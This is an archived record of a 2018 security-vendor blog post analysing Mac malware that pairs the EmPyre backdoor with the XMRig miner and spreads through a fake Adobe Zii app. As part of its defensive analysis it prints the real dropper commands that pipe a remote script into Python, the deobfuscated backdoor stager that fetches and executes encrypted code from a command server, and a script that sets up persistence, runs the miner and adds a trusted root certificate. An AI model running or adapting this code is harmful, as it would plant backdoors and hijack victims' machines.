{
    "id": "72dbd580-6233-45f5-9111-26553c7a6eaa",
    "created_at": "2023-01-12T15:02:36.580459Z",
    "updated_at": "2025-03-27T02:05:19.609469Z",
    "deleted_at": null,
    "sha1_hash": "cf784d1577a800999edbc269af20cdea7feacbca",
    "title": "2018-12-07 - Mac malware combines EmPyre backdoor and XMRig miner",
    "authors": "",
    "file_creation_date": "2022-05-28T17:59:37Z",
    "file_modification_date": "2022-05-28T17:59:37Z",
    "file_size": 217729,
    "plain_text": "# Mac malware combines EmPyre backdoor and XMRig miner\n\n**[blog.malwarebytes.com/threat-analysis/2018/12/mac-malware-combines-empyre-backdoor-and-xmrig-miner/](https://blog.malwarebytes.com/threat-analysis/2018/12/mac-malware-combines-empyre-backdoor-and-xmrig-miner/)**\n\nThomas Reed December 7, 2018\n\nEarlier this week, we discovered a new piece of Mac malware that is combining two different\nopen-source tools—the EmPyre backdoor and the XMRig cryptominer—for the purpose of\nevil.\n\nThe malware was being distributed through an application named Adobe Zii. Adobe Zii is\nsoftware that is designed to aid in the piracy of a variety of Adobe applications. In this case,\nhowever, the app was called Adobe Zii, but it was definitely not the real thing.\n\n\n-----\n\nAs can be seen from the above screenshots, the actual Adobe Zii software, on the left, uses\nthe Adobe Creative Cloud logo. (After all, if you’re going to write software to help people\nsteal Adobe software, why not steal the logo, too?) The malware installer, however, uses a\ngeneric Automator applet icon.\n\n## Behavior\n\nOpening the fake Adobe Zii app with Automator reveals the nature of the software, as it\nsimply runs a shell script:\n```\ncurl https://ptpb.pw/jj9a | python - & s=46.226.108.171:80; curl $s/sample.zip -o\nsample.zip; unzip sample.zip -d sample; cd sample; cd __MACOSX; open -a sample.app\n\n```\nThis script is designed to download and execute a Python script, then download and run an\napp named sample.app.\n\nThe sample.app is simple. It appears to simply be a version of Adobe Zii, most likely for the\npurpose of making it appear that the malware was actually “legitimate.” (This is not to imply\nthat software piracy is legitimate, of course, but rather it means that the malware was\nattempting to look like it was doing what the user thought it was intended to do.)\n\n\n-----\n\nWhat about the Python script? That turned out to be obfuscated, but was easily\ndeobfuscated, revealing the following script:\n```\nimport sys;import re, subprocess;cmd = \"ps -ef | grep Little\\ Snitch | grep -v grep\"\nps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\nout = ps.stdout.read()\nps.stdout.close()\nif re.search(\"Little Snitch\", out):\n  sys.exit()\nimport urllib2;\nUA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like\nGecko';server='http://46.226.108.171:4444';t='/news.php';req=urllib2.Request(server+t)\nreq.add_header('User-Agent',UA);\nreq.add_header('Cookie',\"session=SYDFioywtcFbUR5U3EST96SbqVk=\");\nproxy = urllib2.ProxyHandler();\no = urllib2.build_opener(proxy);\nurllib2.install_opener(o);\na=urllib2.urlopen(req).read();\nIV=a[0:4];data=a[4:];key=IV+'3f239f68a035d40e1891d8b5fdf032d3';S,j,out=range(256),0,\n[]\nfor i in range(256):\n  j=(j+S[i]+ord(key[i%len(key)]))%256\n  S[i],S[j]=S[j],S[i]\ni=j=0\nfor char in data:\n  i=(i+1)%256\n  j=(j+S[i])%256\n  S[i],S[j]=S[j],S[i]\n  out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\nexec(''.join(out))\n\n```\nThe first thing this script does is look for the presence of Little Snitch, a commonly-used\noutgoing firewall that would be capable of bringing the backdoor’s network connection to the\nattention of the user. If Little Snitch is present, the malware bails out. (Of course, if an\noutgoing firewall like Little Snitch were installed, it would have already blocked the\nconnection that would have attempted to download this script, so checking at this point is\nworthless.)\n\nThis script opens up a connection to an EmPyre backend, which is capable of pushing\narbitrary commands to the infected Mac. Once the backdoor is open, it receives a command\nthat downloads the following script to /private/tmp/uploadminer.sh and executes it:\n\n\n-----\n\n```\n# osascript e do shell script \\ networksetup setsecurewebproxy Wi Fi \n46.226.108.171 8080 && networksetup -setwebproxy \"Wi-Fi\" 46.226.108.171 8080 && curl\n-x http://46.226.108.171:8080 http://mitm.it/cert/pem -o verysecurecert.pem &&\nsecurity add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain\nverysecurecert.pem\\\" with administrator privileges\"\ncd ~/Library/LaunchAgents\ncurl -o com.apple.rig.plist http://46.226.108.171/com.apple.rig.plist\ncurl -o com.proxy.initialize.plist http://46.226.108.171/com.proxy.initialize.plist\nlaunchctl load -w com.apple.rig.plist\nlaunchctl load -w com.proxy.initialize.plist\ncd /Users/Shared\ncurl -o config.json http://46.226.108.171/config.json\ncurl -o xmrig http://46.226.108.171/xmrig\nchmod +x ./xmrig\nrm -rf ./xmrig2\nrm -rf ./config2.json\n./xmrig -c config.json &\n\n```\nThis script downloads and installs the other components of the malware. A launch agent\nnamed com.proxy.initialize.plist was created to keep the backdoor open persistently by\nrunning exactly the same obfuscated Python script mentioned previously.\n\nThe script also downloads the XMRig cryptominer and a config file into the /Users/Shared/\nfolder, and sets up a launch agent named com.apple.rig.plist to keep the XMRig process\nrunning with that configuration active. (The “com.apple” name is an immediate red flag that\nwas the root cause of the discovery of this malware.)\n\nInterestingly, there’s code in that script to download and install a root certificate associated\nwith the mitmproxy software, which is software capable of intercepting all web traffic,\nincluding (with the aid of the certificate) encrypted “https” traffic. However, that code was\ncommented out, indicating it was not active.\n\nOn the surface, this malware appears to be fairly harmless. Cryptominers typically only\ncause the computer to slow down, thanks to a process that sucks up all the CPU/GPU.\n\nHowever, this is not just a cryptominer. It’s important to keep in mind that the cryptominer\nwas installed through a command issued by the backdoor, and there may very well have\nbeen other arbitrary commands sent to infected Macs by the backdoor in the past. It’s\nimpossible to know exactly what damage this malware might have done to infected systems.\nJust because we have only observed the mining behavior does not mean it hasn’t ever done\nother things.\n\n## Implications\n\n[Malwarebytes for Mac detects this malware as OSX.DarthMiner. If you’re infected, it’s](http://www.malwarebytes.com/mac)\nimpossible to say what else the malware may have done besides cryptomining. It’s entirely\npossible it could have exfiltrated files or captured passwords.\n\n\n-----\n\nThere s an important lesson to learn from this. Software piracy is known to be one of the\nriskiest activities you can undertake on your Mac. The danger of infection is high, and this is\nnot new, yet people still engage in this behavior. Please, in the future, do yourself a favor and\ndon’t pirate software. The costs can be far higher than purchasing the software you’re trying\nto get for free.\n\n## IOCs\n```\nAdobe Zii.app.zip\nSHA256: ebecdeac53069c9db1207b2e0d1110a73bc289e31b0d3261d903163ca4b1e31e\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-12-07 - Mac malware combines EmPyre backdoor and XMRig miner.pdf"
    ],
    "report_names": [
        "2018-12-07 - Mac malware combines EmPyre backdoor and XMRig miner.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535756,
    "ts_updated_at": 1743041119,
    "ts_creation_date": 1653760777,
    "ts_modification_date": 1653760777,
    "files": {
        "pdf": "https://archive.orkl.eu/cf784d1577a800999edbc269af20cdea7feacbca.pdf",
        "text": "https://archive.orkl.eu/cf784d1577a800999edbc269af20cdea7feacbca.txt",
        "img": "https://archive.orkl.eu/cf784d1577a800999edbc269af20cdea7feacbca.jpg"
    }
}